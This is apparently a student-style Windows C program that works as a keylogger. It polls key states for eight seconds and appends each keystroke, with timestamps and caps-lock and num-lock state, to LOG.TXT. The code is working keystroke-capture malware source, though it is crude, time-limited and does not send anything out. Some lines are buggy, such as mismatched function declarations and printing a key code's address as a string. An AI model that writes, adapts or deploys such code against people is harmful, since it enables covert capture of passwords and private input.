#include<stdio.h>														//for input/output operations
#include<time.h>														//use to define time functions
#include<windows.h>						

FILE *ptr,*f1,*f2;														//file pointer																		
int day();  															//function declarations
int ti();																			
int Save (int key, char *file);										
				
int day(char *file)														// to calculate present day	
{
	ptr=fopen(file,"a+");														  //open file in append mode										
		time_t t = time(NULL);													  //variable declaration of type time
		struct tm tm = *localtime(&t);									          //this function returns a pointer to tm structure with time info filled in 
		fprintf(ptr,"(%d-%d-%d)\n", tm.tm_year + 1900, tm.tm_mon + 1,tm.tm_mday);       //prints in file LOG.TXT
		if(GetKeyState(VK_CAPITAL))												  //checks whether input key is pressed or not
		{
			fprintf(ptr,"%s \n","capslock is on");
		}
		else
		{
			fprintf(ptr,"%s \n","capslock is off");	
		}
  
		if(GetKeyState(VK_NUMLOCK))
		{
			fprintf(ptr,"%s \n","numlock is on");
		}
		else
		{
			fprintf(ptr,"%s \n","numlock is off");	
		}
   
	fclose(ptr);																//close the file
	return 0;
 }

int ti()																            // to calculate at which time the key is pressed
{
	time_t raw_time;																//variable of time type
    struct tm *ptr_ts;																//structure tm is created to store time variables
    time ( &raw_time );															//pre-defined time function
    ptr_ts = gmtime ( &raw_time );											
	if((ptr_ts->tm_min+30)>=60)												//checks for minutes in IST
		{                
			fprintf (ptr,"(%2d:%02d:%02d)\n",ptr_ts->tm_hour+5+1, ptr_ts->tm_min+30-60, ptr_ts->tm_sec);	
		}	
	 else if((ptr_ts->tm_min+30)<60)
		{                
			fprintf (ptr,"(%2d:%02d:%02d)\n",ptr_ts->tm_hour+5, ptr_ts->tm_min+30, ptr_ts->tm_sec);
		}		
 return 0;
}

int Save (int key,char *file)											// to save pressed key in file
{
	ptr=fopen(file,"a+");
	 
   if((key==1)||(key==2))												//if any valid key is not pressed return 0;
		return 0;
   if(key==8)								
     fprintf(ptr,"%s","[backspace]");
   else if(key==13)
       fprintf(ptr,"%s","[enter]");
   else if(key==32)
		fprintf(ptr,"%s","[spacebar]");
   else if(key==VK_TAB)
       fprintf(ptr,"%s","[tab]");
   else if(key==VK_SHIFT)
       fprintf(ptr,"%s","[shift]");
   else if(key==VK_CAPITAL)
	   fprintf(ptr,"%s","[capital]");
   else if(key==VK_CONTROL)
       fprintf(ptr,"%s","[control]");
   else if(key==VK_ESCAPE)
       fprintf(ptr,"%s","[escape]");
   else if(key==VK_END)
       fprintf(ptr,"%s","[end]");
   else if(key==VK_HOME)
       fprintf(ptr,"%s","home");
   else if(key==VK_LEFT)
       fprintf(ptr,"%s","[left]");
   else if(key==VK_UP)
       fprintf(ptr,"%s","[up]");
   else if(key==VK_RIGHT)
       fprintf(ptr,"%s","[right]");
else if(key==45)
       fprintf(ptr,"%s","[-]");
   else if(key==VK_DOWN)
       fprintf(ptr,"%s","[down]");
   else if(key==VK_RETURN)
       fprintf(ptr,"%s","[enter]");
   else if(key==190 || key==110)
       fprintf(ptr,"%s",".");
   else if(key==44)
	   fprintf(ptr,"%s","[printscreen]");
   else if(key==VK_DELETE)
	   fprintf(ptr,"%s","[delete]");
	else if(key==VK_PRIOR)
		fprintf(ptr,"%s","[page up]");
	else if(key==VK_NEXT)
		fprintf(ptr,"%s","[page down]");
	else if(key==VK_NUMLOCK)
		fprintf(ptr,"%s","[numlock]");
	else if(key==VK_NUMPAD0)
		fprintf(ptr,"%s","0");
	else if(key==VK_NUMPAD1)
		fprintf(ptr,"%s","1");
	else if(key==VK_NUMPAD2)
		fprintf(ptr,"%s","2");
	else if(key==VK_NUMPAD3)
		fprintf(ptr,"%s","3");
	else if(key==VK_NUMPAD4)
		fprintf(ptr,"%s","4");
	else if(key==VK_NUMPAD5)
		fprintf(ptr,"%s","5");
	else if(key==VK_NUMPAD6)
		fprintf(ptr,"%s","6");
	else if(key==VK_MENU)
		fprintf(ptr,"%s","[alt]");
	else if(key==VK_NUMPAD7)
		fprintf(ptr,"%s","7");
	else if(key==VK_NUMPAD8)
		fprintf(ptr,"%s","8");
	else if(key==VK_NUMPAD9)
		fprintf(ptr,"%s","9");
	else if(key==VK_MULTIPLY)
		fprintf(ptr,"%s","*");
	else if(key==VK_ADD)
		fprintf(ptr,"%s","+");
	else if(key==VK_SUBTRACT)
		fprintf(ptr,"%s","-");
	else if(key==VK_DIVIDE)
		fprintf(ptr,"%s","/");
	else if(key==VK_LWIN)
		fprintf(ptr,"%s","[win]");
	else if(GetAsyncKeyState(VK_SHIFT))													//checks for the state of shift key
	{
		if(key==49)
			fprintf(ptr,"%s","!");
		else if(key==50)
			fprintf(ptr,"%s","@");
		else if(key==51)
			fprintf(ptr,"%s","#");
		else if(key==52)
			fprintf(ptr,"%s","$");
		else if(key==53)
			fprintf(ptr,"%s","%");
		else if(key==54)
			fprintf(ptr,"%s","^");
		else if(key==55)
			fprintf(ptr,"%s","&");
		else if(key==56)
			fprintf(ptr,"%s","*");
		else if(key==57)
			fprintf(ptr,"%s","(");
		else if(key==48)
			fprintf(ptr,"%s",")");
		else if(key==VK_F1)
			fprintf(ptr,"%s","[f1]");
		else if(key==VK_F2)
			fprintf(ptr,"%s","[f2]");
		else if(key==VK_F3)
			fprintf(ptr,"%s","[f3]");
		else if(key==VK_F4)
			fprintf(ptr,"%s","[f4]");
		else if(key==VK_F5)
			fprintf(ptr,"%s","[f5]");
		else if(key==VK_F6)
			fprintf(ptr,"%s","[f6]");
		else if(key==VK_F7)
			fprintf(ptr,"%s","[f7]");
		else if(key==VK_F8)
			fprintf(ptr,"%s","[f8]");
		else if(key==VK_F9)
			fprintf(ptr,"%s","[f9]");
		else if(key==VK_F10)
			fprintf(ptr,"%s","[f10]");
		else if(key==VK_F11)
			fprintf(ptr,"%s","[f11]");
		else if(key==VK_F12)
			fprintf(ptr,"%s","[f12]");
	}
    else
       fprintf(ptr,"%s",&key);
   
	ti();																			//time function is called	
 fclose(ptr);																			//file is closed
   return 0;
}

int main()						
{
    char i;
	
	time_t endwait;
    time_t start = time(NULL);
    time_t seconds = 8; 												// end loop after this time has elapsed
    endwait = start + seconds;											

   	day("LOG.TXT");														//day function is called
	
    while(start < endwait)
	{
	   for(i=8;i<=190 ;i++)												//for loop to get KEY codes
		{ 
		 start = time(NULL);
		    if(start>endwait)
	        {
	          break;
			}
		    if(GetAsyncKeyState(i)==-32767)       					//checks whether the input key is -32767(0x8001) which checks if the key is pressed or not
			{
              Save(i,"LOG.TXT");									//Save function is called 
	        }
	    }
	}										
}